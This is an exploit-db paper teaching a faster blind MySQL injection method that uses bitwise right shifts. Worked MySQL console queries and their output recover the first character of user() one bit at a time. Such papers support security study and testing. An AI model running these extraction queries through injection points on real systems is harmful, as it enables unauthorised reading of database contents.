# Blind-MySQL-Injection-Using-Bit-Shifting
URL: https://www.exploit-db.com/papers/17073

http://h.ackack.net/faster-blind-mysql-injection-using-bit-shifting.html for a HTML version
   Made by Jelmer de Hen       H.ackAck.net


While strolling through mysql.com I came across this page http://dev.mysql.com/doc/refman/5.0/en/bit-functions.html.

There you can view the possibility of the bitwise function right shift.

A bitwise right shift will shift the bits 1 location to the right and add a 0 to the front.

Here is an example:

mysql> select ascii(b'00000010');

+--------------------+

| ascii(b'00000010') |

+--------------------+

|                  2 |

+--------------------+

1 row in set (0.00 sec)

Right shifting it 1 location will give us:

mysql> select ascii(b'00000010') >> 1;

+-------------------------+

| ascii(b'00000010') >> 1 |

+-------------------------+

|                       1 |

+-------------------------+

1 row in set (0.00 sec)

It will add a 0 at the front and remove 1 character at the end.
00000010      = 2
00000010 >> 1 = 00000001
		^      ^
		0      shifted


So let's say we want to find out a character of a string during blind MySQL injection and use the least possible amount of requests and do it as soon as possible we could use binary search but that will quickly take a lot of requests.
First we split the ascii table in half and try if it's on 1 side or the other, that leaves us ~64 possible characters.
Next we chop it in half again which will give us 32 possible characters.
Then again we get 16 possible characters.
After the next split we have 8 possible characters and from this point it's most of the times guessing or splitting it in half again.

Let's see if we can beat that technique by optimizing this - but first more theory about the technique I came up with.

There are always 8 bits reserved for ASCII characters.
An ASCII character can be converted to it's decimal value as you have seen before:

mysql> select ascii('a');

+------------+

| ascii('a') |

+------------+

|         97 |

+------------+

1 row in set (0.00 sec)

This will give a nice int which can be used as binary.

a = 01100001

If we would left shift this character 7 locations to the right you would get:

00000000

The first 7 bits are being added by the shift, the last character remains which is 0.

mysql> select ascii('a') >> 7;

+-----------------+

| ascii('a') >> 7 |

+-----------------+

|               0 |

+-----------------+

1 row in set (0.00 sec)


a = 01100001

01100001 >> 7 == 00000000 == 0
01100001 >> 6 == 00000001 == 1
01100001 >> 5 == 00000011 == 3
01100001 >> 4 == 00000110 == 6
01100001 >> 3 == 00001100 == 12
01100001 >> 2 == 00011000 == 24
01100001 >> 1 == 00110000 == 48
01100001 >> 0 == 01100001 == 97

When we did the bitshift of 7 we had 2 possible outcomes - 0 or 1 and we can compare it to 0 and 1 and determine that way if it was 1 or 0.

mysql> select (ascii('a') >> 7)=0;

+---------------------+

| (ascii('a') >> 7)=0 |

+---------------------+

|                   1 |

+---------------------+

1 row in set (0.00 sec)

It tells us that it was true that if you would shift it 7 bits the outcome would be equal to 0.
Once again, if we would right shift it 6 bits we have the possible outcome of 1 and 0.

mysql> select (ascii('a') >> 6)=0;

+---------------------+

| (ascii('a') >> 6)=0 |

+---------------------+

|                   0 |

+---------------------+

1 row in set (0.00 sec)

This time it's not true so we know the first 2 bits of our character is "01".
If the next shift will result in "010" it would equal to 2; if it would be "011" the outcome would be 3.

mysql> select (ascii('a') >> 5)=2;

+---------------------+

| (ascii('a') >> 5)=2 |

+---------------------+

|                   0 |

+---------------------+

1 row in set (0.00 sec)

It is not true that it is 2 so now we can conclude it is "011".
The next possible options are:
0110 = 6
0111 = 7

mysql> select (ascii('a') >> 4)=6;

+---------------------+

| (ascii('a') >> 4)=6 |

+---------------------+

|                   1 |

+---------------------+

1 row in set (0.00 sec)

We got "0110" now and looking at the table for a above here you can see this actually is true.
Let's try this on a string we actually don't know, user() for example.


First we shall right shift with 7 bits, possible results are 1 and 0.

mysql> select (ascii((substr(user(),1,1))) >> 7)=0;

+--------------------------------------+

| (ascii((substr(user(),1,1))) >> 7)=0 |

+--------------------------------------+

|                                    1 |

+--------------------------------------+

1 row in set (0.00 sec)

We now know that the first bit is set to 0.
0???????

The next possible options are 0 and 1 again so we compare it with 0.

mysql> select (ascii((substr(user(),1,1))) >> 6)=0;

+--------------------------------------+

| (ascii((substr(user(),1,1))) >> 6)=0 |

+--------------------------------------+

|                                    0 |

+--------------------------------------+

1 row in set (0.00 sec)

Now we know the second bit is set to 1.
01??????

Possible next options are:
010 = 2
011 = 3

mysql> select (ascii((substr(user(),1,1))) >> 5)=2;

+--------------------------------------+

| (ascii((substr(user(),1,1))) >> 5)=2 |

+--------------------------------------+

|                                    0 |

+--------------------------------------+

1 row in set (0.00 sec)

Third bit is set to 1.
011?????

Next options:
0110 = 6
0111 = 7

mysql> select (ascii((substr(user(),1,1))) >> 4)=6;

+--------------------------------------+

| (ascii((substr(user(),1,1))) >> 4)=6 |

+--------------------------------------+

|                                    0 |

+--------------------------------------+

1 row in set (0.00 sec)

This bit is also set.
0111????

Next options:
01110 = 14
01111 = 15

mysql> select (ascii((substr(user(),1,1))) >> 3)=14;

+---------------------------------------+

| (ascii((substr(user(),1,1))) >> 3)=14 |

+---------------------------------------+

|                                     1 |

+---------------------------------------+

1 row in set (0.00 sec)

01110???

Options:
011100 = 28
011101 = 29

mysql> select (ascii((substr(user(),1,1))) >> 2)=28;

+---------------------------------------+

| (ascii((substr(user(),1,1))) >> 2)=28 |

+---------------------------------------+

|                                     1 |

+---------------------------------------+

1 row in set (0.00 sec)

011100??

Options:
0111000 = 56
0111001 = 57

mysql> select (ascii((substr(user(),1,1))) >> 1)=56;

+---------------------------------------+

| (ascii((substr(user(),1,1))) >> 1)=56 |

+---------------------------------------+

|                                     0 |

+---------------------------------------+

1 row in set (0.00 sec)

0111001?
Options:
01110010 = 114
01110011 = 115

mysql> select (ascii((substr(user(),1,1))) >> 0)=114;

+----------------------------------------+

| (ascii((substr(user(),1,1))) >> 0)=114 |

+----------------------------------------+

|                                      1 |

+----------------------------------------+

1 row in set (0.00 sec)

Alright, so the binary representation of the character is:
01110010

Converting it back gives us:

mysql> select b'01110010';

+-------------+

| b'01110010' |

+-------------+

| r           |

+-------------+

1 row in set (0.00 sec)

So the first character of user() is "r".

With this technique we can assure that we have the character in 8 requests.

Further optimizing this technique can be done.
The ASCII table is just 127 characters which is 7 bits per character so we can assume we will never go over it and decrement this technique with 1 request per character.

Chances are higher the second bit will be set to 1 since the second part of the ASCII table (characters 77-127) contain the characters a-z A-Z - the first part however contains numbers which are also used a lot but when automating it you might just want to try and skip this bit and immediatly try for the next one.
